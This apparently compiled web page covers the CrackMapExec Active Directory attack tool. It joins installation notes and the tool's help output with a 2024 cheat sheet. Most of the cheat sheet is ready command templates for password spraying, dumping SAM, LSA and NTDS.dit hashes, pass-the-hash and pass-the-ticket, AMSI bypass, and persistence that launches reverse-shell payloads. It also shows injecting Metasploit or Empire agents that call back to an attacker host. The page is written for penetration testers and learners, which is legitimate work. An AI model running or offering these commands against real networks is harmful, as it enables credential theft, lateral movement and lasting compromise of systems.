# Installation

mpgn edited this page on Sep 21, 2020 · [42 revisions](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation/_history)

# Installation

[](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation#installation)

If you just want to use the tool, you can install CME in a few different ways according to what you find easiest.

- [Docker](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation#docker)
- [Official Binary releases](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation#binaries)
- [Python Package](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation#python-package)

If you intend on making code changes and/or submitting a Pull Request, see [Installing from source](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation#installing-from-source)

## Docker

[](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation#docker)

`docker pull byt3bl33d3r/crackmapexec`

Yup. Easy peasy.

## Binaries

[](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation#binaries)

- **You need a compatible version of Python 3 installed in order to run the binaries**

For the latest stable binary releases, go [here](https://github.com/byt3bl33d3r/CrackMapExec/releases)

If you want the latest bleeding-edge binaries, **you need to be logged into Github in order to see them and download them:** go to the actions tab (at the top of the repo), click on the latest build and download the appropriate binary according to your OS.

## Python Package

[](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation#python-package)

It's highly recommended you use [Pipx](https://github.com/pipxproject/pipx) to install CME as it isolates all its dependencies for you and eliminates 90% of all problems you'll usually encounter while installing it this way.

```shell
#~ python3 -m pip install pipx
#~ pipx ensurepath
#~ pipx install crackmapexec
```

## Installing from Source

[](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation#installing-from-source)

**You should only install from source if you intend on making changes to the code and/or submitting a PR**

Please note the `--recursive` flag passed to the `git clone` command. This flag will make `git` automatically download all of the sub-modules CME depends on. Without this flag installation will fail and heads might explode.

You're going to need to install [Poetry](https://python-poetry.org/docs/#installation) which is what CME uses to manage dependencies.

```shell
#~ apt-get install -y libssl-dev libffi-dev python-dev build-essential
#~ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
#~ cd CrackMapExec
#~ poetry install
#~ poetry run crackmapexec
```

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation). Be sure to check out the original post for more details.
# CrackMapExec

[](https://github.com/trustedsec/CrackMapExec#crackmapexec)

A swiss army knife for pentesting Windows/Active Directory environments

Powered by [Impacket](https://github.com/CoreSecurity/impacket)

This project was inspired by/based off of:

- @agsolino's [wmiexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py), [wmiquery.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiquery.py), [smbexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbexec.py), [samrdump.py](https://github.com/CoreSecurity/impacket/blob/master/examples/samrdump.py), [secretsdump.py](https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py), [atexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/atexec.py) and [lookupsid.py](https://github.com/CoreSecurity/impacket/blob/master/examples/lookupsid.py) scripts (beyond awesome)
- @ShawnDEvans's [smbmap](https://github.com/ShawnDEvans/smbmap)
- @gojhonny's [CredCrack](https://github.com/gojhonny/CredCrack)
- @pentestgeek's [smbexec](https://github.com/pentestgeek/smbexec)

Unintentional contributors:

- @T-S-A's [smbspider](https://github.com/T-S-A/smbspider) script
- The [Empire](https://github.com/PowerShellEmpire/Empire) project

This repo also includes the [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) repository as a submodule.

#Description

CrackMapExec is your one-stop-shop for pentesting Windows/Active Directory environments!

From enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL's into memory using Powershell, dumping the NTDS.dit and more!

The biggest improvements over the above tools are:

- Pure Python script, no external tools required
- Fully concurrent threading
- Uses **ONLY** native WinAPI calls for discovering sessions, users, dumping SAM hashes etc...
- Opsec safe (no binaries are uploaded to dump clear-text credentials, inject shellcode etc...)

#Installation

See the [Installation](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation) wiki page for install instructions

#Quick Demo

**Demo of V3.0 coming soon!**

#Usage

```
  ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______ 
 /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
|  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
|  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |     
|  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
 \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                 Swiss army knife for pentesting Windows/Active Directory environments | @byt3bl33d3r

                       Powered by Impacket https://github.com/CoreSecurity/impacket (@agsolino)

                                                   Inspired by:
                            @ShawnDEvans's smbmap https://github.com/ShawnDEvans/smbmap
                            @gojhonny's CredCrack https://github.com/gojhonny/CredCrack
                            @pentestgeek's smbexec https://github.com/pentestgeek/smbexec
                                                     
                                                  Version: 3.0
                                        Codename: 'So looong gay boy!'

positional arguments:
  target                The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containg a list of targets

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -t THREADS            Set how many concurrent threads to use (defaults to 100)
  -id CRED_ID           Database credential ID to use for authentication
  -u [USERNAME [USERNAME ...]]
                        Username(s) or file(s) containing usernames
  -d DOMAIN             Domain name
  -p [PASSWORD [PASSWORD ...]]
                        Password(s) or file(s) containing passwords
  -H [HASH [HASH ...]]  NTLM hash(es) or file(s) containing NTLM hashes
  -m MODULE             Payload module to use
  -o [MODULE_OPTION [MODULE_OPTION ...]]
                        Payload module options
  --module-info         Display module info
  --share SHARE         Specify a share (default: C$)
  --smb-port {139,445}  SMB port (default: 445)
  --mssql-port PORT     MSSQL port (default: 1433)
  --server {http,https}
                        Use the selected server (default: https)
  --server-port PORT    Start the server on the specified port
  --local-auth          Authenticate locally to each target
  --timeout TIMEOUT     Max timeout in seconds of each thread (default: 20)
  --verbose             Enable verbose output

Credential Gathering:
  Options for gathering credentials

  --sam                 Dump SAM hashes from target systems
  --lsa                 Dump LSA secrets from target systems
  --ntds {vss,drsuapi}  Dump the NTDS.dit from target DCs using the specifed method
                        (drsuapi is the fastest)
  --ntds-history        Dump NTDS.dit password history
  --ntds-pwdLastSet     Shows the pwdLastSet attribute for each NTDS.dit account
  --wdigest {enable,disable}
                        Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1

Mapping/Enumeration:
  Options for Mapping/Enumerating

  --shares              Enumerate shares and access
  --uac                 Checks UAC status
  --sessions            Enumerate active sessions
  --disks               Enumerate disks
  --users               Enumerate users
  --rid-brute [MAX_RID]
                        Enumerate users by bruteforcing RID's (default: 4000)
  --pass-pol            Dump password policy
  --lusers              Enumerate logged on users
  --wmi QUERY           Issues the specified WMI query
  --wmi-namespace NAMESPACE
                        WMI Namespace (default: //./root/cimv2)

Spidering:
  Options for spidering shares

  --spider [FOLDER]     Folder to spider (default: root directory)
  --content             Enable file content searching
  --exclude-dirs DIR_LIST
                        Directories to exclude from spidering
  --pattern [PATTERN [PATTERN ...]]
                        Pattern(s) to search for in folders, filenames and file content
  --regex [REGEX [REGEX ...]]
                        Regex(s) to search for in folders, filenames and file content
  --depth DEPTH         Spider recursion depth (default: 10)

Command Execution:
  Options for executing commands

  --exec-method {atexec,smbexec,wmiexec}
                        Method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
  --force-ps32          Force the PowerShell command to run in a 32-bit process
  --no-output           Do not retrieve command output
  -x COMMAND            Execute the specified command
  -X PS_COMMAND         Execute the specified PowerShell command

MSSQL Interaction:
  Options for interacting with MSSQL DBs

  --mssql               Switches CME into MSSQL Mode. If credentials are provided will authenticate against all discovered MSSQL DBs
  --mssql-query QUERY   Execute the specifed query against the MSSQL DB

HA! Made you look!
```

#To do

- Kerberos support
- ~~0wn everything~~

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/trustedsec/CrackMapExec). Be sure to check out the original post for more details.


# CrackMapExec Cheat Sheet 2024 (Commands & Examples)

May 13, 2024 / By  [Adam Goss](https://www.stationx.net/author/adam-goss/ "Adam Goss")

![CrackMapExec Cheat Sheet](https://www.stationx.net/wp-content/uploads/2024/04/CrackMapExec-Cheat-Sheet-.png)

[](https://www.linkedin.com/shareArticle?title=CrackMapExec%20Cheat%20Sheet%202024%20%28Commands%20%26%20Examples%29&url=https%3A%2F%2Fwww.stationx.net%2Fcrackmapexec-cheat-sheet%2F&mini=true)[](https://x.com/intent/post?text=CrackMapExec%20Cheat%20Sheet%202024%20%28Commands%20%26%20Examples%29&url=https%3A%2F%2Fwww.stationx.net%2Fcrackmapexec-cheat-sheet%2F)[](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.stationx.net%2Fcrackmapexec-cheat-sheet%2F)

__Listen to the article

CrackMapExec is widely used, incredibly versatile, and a great addition to your hacking arsenal.

This CrackMapExec cheat sheet includes everything you need to get started using this powerful penetration testing tool used by penetration testers, red teamers, and cyber security professionals to test their systems against cyber attacks.

It includes everything from installation to common commands covering enumeration, brute force attacks, gaining access, post-exploitation, integrations, and advanced techniques.

Let’s jump straight in with the key commands you need to know!

## What Is CrackMapExec

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (CME) is an open-source [hacking tool](https://www.stationx.net/network-penetration-testing-tools/) that automates gathering information, executing advanced password attacks, and performing post-exploitation activities like lateral movement.

It’s designed to be a “Swiss Army knife” for targeting Windows Active Directory environments and has been used in many [real-world attacks](https://www.trendmicro.com/en_us/research/22/d/an-investigation-of-the-blackcat-ransomware.html).

Some key features of CrackMapExec include:

- **Active Directory Enumeration**: It can enumerate Active Directory domains, forests, users, groups, computers, and trust relationships to gather information about the target environment.
- **Credential Brute Forcing**: The tool can attack various network services (e.g., SMB, RPC, LDAP, and WinRM) with password spraying, credential stuffing, and brute force attacks.
- **Remote Code Execution**: Using CrackMapExec, you can execute commands and scripts remotely on target systems using [PowerShell](https://www.stationx.net/powershell-cheat-sheet/), WMI, SMB, and PSExec.
- **Lateral Movement**: CME can perform lateral movement and jump between compromised machines on the internal corporate network using techniques like [pass-the-hash](https://www.stationx.net/pass-the-hash-attack/), [pass-the-ticket](https://www.stationx.net/how-to-use-mimikatz/), and [token impersonation](https://www.stationx.net/windows-privilege-escalation/).
- **Strong Integration Support:** The tool's API and scripting support make it easy to integrate with other penetration testing tools, such as [Metasploit](https://www.stationx.net/metasploit-tutorial/), [PowerShell Empire](https://www.stationx.net/how-to-use-powershell-empire/), and [BloodHound](https://www.stationx.net/how-to-use-bloodhound-active-directory/).

CrackMapExec is an incredibly powerful tool to add to your arsenal. Its ability to conduct post-exploitation activities against Active Directory environments is unmatched by any other open-source tool.

[Penet](https://www.stationx.net/how-to-become-a-penetration-tester/)[r](https://www.stationx.net/how-to-become-a-penetration-tester/)[ation testers](https://www.stationx.net/how-to-become-a-penetration-tester/) or [red teamers](https://www.stationx.net/red-teaming-vs-penetration-testing/) can harness this ability to perform thorough assessments of an organization's security posture, identify vulnerabilities, and recommend improvements that bolster its cyber defense.

Now that you know why you should learn CrackMapExec, let’s get our hands dirty and see how to use it.

## Installing CrackMapExec

CrackMapExec is installed by default on [Kali Linux](https://www.stationx.net/how-to-install-kali-linux-on-virtualbox/). However, there are several installation options if you don’t want to use Kali.

#### Installing CrackMapExcec with package manager

You can install CrackMapExec with the [apt package manager](https://www.linode.com/docs/guides/apt-package-manager/) from the Kalix Linux repositories with the following command: `apt install crackmapexec`

If you don’t have the Kali Linux repositories installed on your machine, read how to add the [Kali Linux official repositories to the sources list](https://computingforgeeks.com/add-kali-linux-official-repositories-to-sources-list/).

#### Installing CrackMapExcec with Docker

You can install CrackMapExec using [Docker](https://docs.docker.com/manuals/) with the command: `docker pull byt3bl33d3r/crackmapexec`

Check out the [installation documentation](https://docs.docker.com/engine/install/) on the official website to learn how to install Docker on your machine.

#### Installing CrackMapExcec as a Python package

To install CrackMapExec as a [Python](https://www.stationx.net/python-for-cyber-security/) package using the [pip package installer](https://pip.pypa.io/en/stable/installation/), run the following commands:

`python3 -m pip install pipx`

`pipx ensurepath`

`pipx install crackmapexec`

Here, [Pipx](https://github.com/pipxproject/pipx) is used to isolate all its dependencies and eliminate common installation problems. You can also use other Python virtual environments, like [venv](https://docs.python.org/3/library/venv.html).

#### Installing CrackMapExcec From GitHub

Finally, you can install CrackMapExec from the CrackMapExec GitHub using the following commands:

`apt-get install -y libssl-dev libffi-dev python-dev build-essential`

`git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec`

`cd CrackMapExec`

`poetry install`

`poetry run crackmapexec`

Once you have CrackMapExec installed, you can explore its rich feature set.
## General CrackMapExec Syntax and Options

All CrackMapExec commands follow this syntax: `crackmapexec [runtime options] <service> [options] [-M _module_] [-o _module options_] <target>.`

|   |   |   |
|---|---|---|
|**Command Line Component**|**Description**|**Examples**|
|`[runtime options]`|These are runtime options that affect the performance of the command.|`-h` to display the help menu`-t THREADS` to set the number of concurrent threads`--timeout TIMEOUT` sets a max timeout in seconds for each thread`--jitter INTERVAL` to set a random delay between each connection|
|`<service>`|CrackMapExec can interact with various services running on the target machine. Each can be used to perform specific tasks related to enumeration, exploitation, or lateral movement.|`winrm;ldap;ssh;rdp;mssql;FTP`; `smb`|
|`[options]`|Options are specific to the service you are targeting, but there are common ones you will see.|`-u` for username  <br>`-p` for password  <br>`-h` to get help for that module  <br>`-x COMMAND` to execute a command on the target  <br>`-X PS_COMMAND` to execute a PowerShell command-`L` list modules available for service|
|`[-M _module_]`|Each service CrackMapExec supports has various modules that you can use to exploit vulnerabilities, target credentials, or gather information.|`-M powerview` wrapper for [PowerView’s functions](https://www.stationx.net/how-to-use-powersploit) `-M shellinject` injects raw shellcode into memory`-M zerologon` exploits [ZeroLogon vulnerability](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) `test_connection` pings a host|
|`[-o _module options_]`|These are options specific to the module you choose to run.|`-o LHOST=<local-host>` specify the local host for a Metasploit command`-o LISTENER=<listener>` specify a listener for a PowerShell Empire launcher|
|`<target>.`|The target is the IP address, network range, or hostname of the machine(s) you’re attacking.|`192.168.1.100`  <br>`10.0.39.0/24`  <br>`webserver1`|

![crackmapexec-help-menu](https://www.stationx.net/wp-content/uploads/2024/04/crackmapexec-help-menu.jpg)

_CrackMapExec Help Menu_

![crackmapexec-smb-help-menu-min](https://www.stationx.net/wp-content/uploads/2024/04/1.-crackmapexec-smb-help-menu-min.jpg)

_CrackMapExec smb Option Help Menu_

![2. crackmapexec-smb-module-menu](https://www.stationx.net/wp-content/uploads/2024/04/2.-crackmapexec-smb-module-menu-min.jpg)

_CrackMapExec smb Modules_

## Discovery and Enumeration With CrackMapExec

CrackMapExec’s `smb` option is great for gathering information about a target. It can identify live hosts and collect data on domain users, groups, network shares, computers, and active sessions.

It can even let you execute your own [Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) (WMI) queries to gather information about Active Directory objects, such as organizational units (OUs), policies, and service accounts, while blending in with legitimate network traffic.

|   |   |
|---|---|
|**Command**|**Description**|
|`Crackmapexec  <service> <target>`|Scan `<target>` for a specific service (e.g. `winrm, ldap, ssh, rdp, mssql, ftp, smb`.). This can be used to identify live hosts and open ports.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --users <target>`|Enumerates domain users. If a user is specified, more information is returned (e.g., access, password policy, etc.)|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --groups <target>`|Enumerates domain groups. If a group is specified, more information is returned.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --shares <target>`|Enumerates shares and access.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --computers <target>`|Enumerates computer users (workstations and servers).|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --sessions <target>`|Enumerates active sessions (users currently accessing a share and you could target).|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --wmi <QUERY> <target>`|Executes a specified WMI query to enumerate specific information about domain objects.|

![crackmapexec-smb-enumeration-min](https://www.stationx.net/wp-content/uploads/2024/04/3.-crackmapexec-smb-enumeration-min.jpg)

_CrackMapExec SMB Enumeration_

## Credential Harvesting and Brute Forcing With CrackMapExec

CrackMapExec is infamous for its password attacks and credential dumping capabilities. The tool can run remote commands on systems to identify high-value accounts (e.g., Administrators) and run password spraying or brute attacks against those accounts.

Once it successfully logs in with a high-value account, it can use its credential dumping features to extract NTLM hashes, cleartext passwords, and Kerberos tickets.

|   |   |
|---|---|
|**Command**|**Description**|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> -x ‘net localgroup administrators’ <target>`|Identifies the local Administrator account across machines.|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> -X ‘Get-LocalGroupMember -Group "Administrators"’ <target>`|Identifies the local Administrator account across machines using PowerShell.|
|`crackmapexec ldap -u <USERNAME> -p <PASSWORD> -M whoami <target>`|Identifies the local Administrator account across machines using `whoami` command.|
|`crackmapexec <service> -u <USERNAME> -p <PASSWORD> <target>`|Performs a password spray attack against `<target>`. The `<USERNAME>` option can be a single user, a list of usernames (comma separated), or a file containing usernames. The same goes for the `<PASSWORD>` option with passwords. Use the runtime options above to tune your attack and avoid getting locked out or detected.|
|`crackmapexec <service> -u <USERNAME> -p <PASSWORD> --port <PORT> <target>`|If the service is not running on its standard port, use the `--port` option to specify the custom port.|
|`crackmapexec <service> -u <USERNAME> -p <PASSWORD> --no-bruteforce <target>`|To try username and password combinations (e.g., user1:password1, user2:password2), rather than password spraying with a list of usernames and/or passwords, use the `--no-bruteforce` option.|
|`crackmapexec <service> -u <USERNAME> -p <PASSWORD> --continue-on-success <target>`|To continue guessing login credentials, even after being successful once, use the `--contine-on-success` option.|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> --sam <target>`|Dump SAM hashes from the target system after a successful login. You can use `smb` or `winrm` services.|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> --lsa <target>`|Dump LSA secrets from the target system after a successful login. You can use `smb` or `winrm` services.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --ntds [vss,drsupai ] <target>`|Dump the NTDS.dit file from the target Domain Controller after a successful login. You can use either `vss` or `drsuapi` as the method (`drsuapi` is the default).|

![crackmapexec-brute-force-min](https://www.stationx.net/wp-content/uploads/2024/04/4.-crackmapexec-brute-force-min.jpg)

_Brute Force Login and Dump Password Hashes With CrackMapExec_
## Gaining Access and Lateral Movement With CrackMapExec

CrackMapExec can target services like SMB, WinRM, and LDAP to gain access to target machines. It can use usernames, passwords, hashes, and Kerberos tickets to authenticate to these services using [pass-the-hash](https://www.stationx.net/pass-the-hash-attack/) and [pass-the-ticket](https://www.stationx.net/how-to-use-mimikatz/) attacks.

Once you’ve gained access to a machine, CrackMapExec is a great tool for performing lateral movement. It can execute custom commands against multiple machines and blend into legitimate traffic using commonly used protocols.

|   |   |
|---|---|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> --sam <target>`|Dumps SAM hashes from the target system after a successful login. You can use `smb` or `winrm` services.|
|`crackmapexec ldap -u <USERNAME> -p <PASSWORD> --asreproast <target>`|Gets AS REP response ready to crack with [Hashcat](https://www.stationx.net/how-to-use-hashcat/) to perform ASREP-roasting.|
|`crackmapexec ldap -u <USERNAME> -p <PASSWORD> --kerberoasting <target>`|Gets the TGS ticket ready to crack with [Hashcat](https://www.stationx.net/how-to-use-hashcat/) to perform [Kerberoasting](https://www.stationx.net/how-to-perform-kerberoasting-attacks/).|
|`crackmapexec <service> -H <HASH> <target>`|For services that use NTLM (e.g., `winrm`, `rdp`, `smb`, `ldap`, `mssql`), you can log in using NTLM hashes. Use the -H option followed by a single hash, a list of hashes (comma-separated), or a file containing hashes. This is known as a pass-the-hash attack.|
|`crackmapexec <prococol> -k <KERBEROS_TICKET> <target>`|For services that use Kerberos (e.g., `winrm, rdp, smb, ldap, mssql`), you can log in using a Kerberos ticket. Use the -k option followed by a Kerberos ticket. This is known as a pass-the-ticket attack.|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> -x <COMMAND> <target>`|Executes the specified command on the target machine after successful login.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --exec-method <METHOD>. -x <COMMAND> <target>`|Executes the specified command on the target machine after successful login using a specific method. This METHOD can be `mmcexec`, `atexec`, `smbexec`, or `wmiexec`.|
|`crackmapexec <service> -u <USERNAME> -p <PASSWORD> <target>`|Lateral movement: login to a remote system using the stolen username or password.|

![crackmapexec-lateral-movement-min](https://www.stationx.net/wp-content/uploads/2024/04/05.-crackmapexec-lateral-movement-min.png)

_CrackMapExec Pass the Hash Attack_

## Post-Exploitation With CrackMapExec

Post-exploitation is another area where CrackMapExec shines. The tool can establish persistence on compromised hosts, collect detailed information about the network, systems, and installed applications, and even move files between machines.

|   |   |
|---|---|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> -M rdp`|Enables RDP on the target machine after a successful login. It’s useful to get an RDP session on target.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> -M impersonate`|Logs in to the machine and lists tokens you can impersonate on the machine to escalate your privileges.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> -M install_elevated`|Checks for files with the `AlwaysInstallElevated` attribute that can be used to escalate your privileges.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> -M enum-avproducts`|Gathers information on all anti-virus and endpoint detection solutions installed on the machine.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --put-file LOCAL REMOTE`|Puts a local file onto the target machine (e.g., `--put-file backdoor.exe \Windows\Temp\backdoor.exe)`.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --get-file REMOTE LOCAL`|Gets a remote file from the target machine (e.g. `--get-file \Windows\Temp\creds.txt. creds.txt`).|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> -M enum_dns`|Logs in to the machine and use WMI to dump DNS from the AD DNS server.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> -M get_netconnections`|Uses WMI to get the target machine’s current network connections.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> -M keypass_discover`|Searches for [KeePass](https://keepass.info/)-related files and processes from which you could steal credentials.|
|`crackmapexec ldap -u <USERNAME> -p <PASSWORD> -M get-network`|Retrieves information about the Active Directory network environments.|
|`crackmapexec ldap -u <USERNAME> -p <PASSWORD> -M laps`|Retrieves Windows Local Administrator Password Solution (LAPS) passwords.|
|`crackmapexec mssql -u <USERNAME> -p <PASSWORD> -M mssql_priv`|Automatically enumerates and exploits [MSSQL privileges](https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver16).|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> --x ‘schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr <PAYLOAD>’ <target>`|Persistence: Creates a scheduled task on the target system that executes a [reverse shell](https://www.stationx.net/reverse-shell-cheat-sheet/) `PAYLOAD` at a specified interval or system event after uploading the `PAYLOAD` to the machine first.|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> --x 'reg add HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun /v <name> /t REG_SZ /d "<PAYLOAD>"' <target>`|Persistence: Executes a registry `PAYLOAD` when the user logs in or the system starts up after uploading the `PAYLOAD` to the machine first.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> --put-file <PAYLOAD> "%APPDATA%MicrosoftWindowsStart MenuProgramsStartup<PAYLOAD>"`|Persistence: Drops a `PAYLOAD` in the Windows startup folder executed when the user logs in.|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> --x sc create <service_name> binPath= "<PAYLOAD>" start= auto' <target>`|Persistence: Installs a service on the target system that executes a `PAYLOAD` on start-up after uploading the `PAYLOAD` to the machine first.|

![crackmapexec-post-exploitation-min](https://www.stationx.net/wp-content/uploads/2024/04/6.-crackmapexec-post-exploitation-min.jpg)

_Executing Post-Exploitation Activities With CrackMapExec_

## CrackMapExec Advanced Techniques and Integrations

CrackMapExec has more advanced features. These include the ability to run PowerShell commands and scripts and even obfuscate them. The tool also integrates with other hacking frameworks like [Metasploit](https://www.stationx.net/metasploit-cheat-sheet/) and [C2 frameworks](https://www.stationx.net/what-is-a-c2-framework/) (e.g., [PowerShell Empire](https://www.stationx.net/how-to-use-powershell-empire/)).

|   |   |
|---|---|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> -X <PS_COMMAND> <target>`|Executes a PowerShell command (`PS_COMMAND`) on the systems after successful login.|
|`crackmapexec <smb\|winrm> -u <USERNAME> -p <PASSWORD> -X <PS_COMMAND> --obfs <target>`|Obfuscates PowerShell scripts/commands ran.|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> -X PS_COMMAND --amsi-bypass <FILE> <target>`|Runs PowerShell scripts and commands with a custom AMSI bypass file (`FILE`). This is a PowerShell file that implements a [AMSI bypass method](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/).|
|`crackmapexec smb -u <USERNAME> -p <PASSWORD> -X <PS_COMMAND> --clear-obfsscripts <target>`|Clears all cached obfuscated PowerShell scripts from memory.|
|`crackmapexec <mssql\|smb> -u <USERNAME> -p <PASSWORD> -M empire_exec -o LISTENER=<listener> <target>`|Lateral movement: Logs in to a remote system using a stolen username or password and automatically generates and executes a [PowerShell Empire](https://www.stationx.net/how-to-use-powershell-empire/) launcher that calls back to the specified `<listener>`. This gives you a PowerShell Empire agent on the system|
|`crackmapexec <mssql\|smb> -u <USERNAME> -p <PASSWORD> --local-auth -M met_inject -o LHOST=<attack-machine> LPORT=<listening-port>`|Logs in to a remote system using the stolen username or password and automatically generates and injects [Metasploit](https://www.stationx.net/metasploit-cheat-sheet/) shellcode that calls back to a Metasploit handler using `LHOST` and `LPORT`. This gives you a Metasploit shell on the system.|

![crackmapexec-advanced-technique-powershell-min](https://www.stationx.net/wp-content/uploads/2024/04/7.-crackmapexec-advanced-technique-powershell-min.jpg)

_Executing Obfuscated PowerShell With CrackMapExec_

**Credit:** This information was adapted from an excellent guide on [StationX](https://www.stationx.net/crackmapexec-cheat-sheet/). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/haBvIG5jHYw?si=1mKpGWyoht089KX_" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=haBvIG5jHYw). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/IY_VyAz3JGA?si=MS3I3EBXXu98fkig" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=IY_VyAz3JGA). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/WPnFnPkOWIg?si=-mqw90BnocKO1Lqn" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=WPnFnPkOWIg&t=1276s). Be sure to check out the original post for more details.
